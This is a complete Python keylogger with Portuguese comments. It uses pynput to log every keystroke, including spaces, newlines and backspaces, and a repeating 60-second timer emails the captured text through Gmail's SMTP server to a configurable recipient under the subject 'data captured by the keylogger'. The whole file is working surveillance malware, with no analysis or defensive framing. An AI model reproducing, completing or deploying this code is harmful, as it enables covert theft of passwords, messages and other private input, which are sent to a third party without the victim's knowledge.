from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configurações de e-mail (Preencher com um email e senhas configurados)
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""

# Método que formata e envia o e-mail em um determinado intervalo de tempo
def enviar_email():
	global log
	if log:
		msg = MIMEText(log)
		msg['SUBJECT'] = "Dados capturados pelo keylogger"
		msg['From'] = EMAIL_ORIGEM
		msg['To'] = EMAIL_DESTINO
		try:
			server = smtplib.SMTP("smtp.gmail.com", 587)
			server.starttls()
			server.login(EMAIL_ORIGEM, SENHA_EMAIL)
			server.send_message(msg)
			server.quit()
		except Exception as e:
			print("Erro ao enviar", e)
		log = ""

	# Agendar o envio a cada 60 segundos
	Timer(60, enviar_email).start()

# Método que recolhe e concatena a tecla pressionada para a variável log
def on_press(key):
	global log
	try:
		log += key.char
	except AttributeError:
		if key == keyboard.Key.space:
			log += " "
		elif key == keyboard.Key.enter:
			log +="\n"
		elif key == keyboard.Key.backspace:
			log += "[<]"
		else:
			pass

# inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
	enviar_email()
	listener.join()
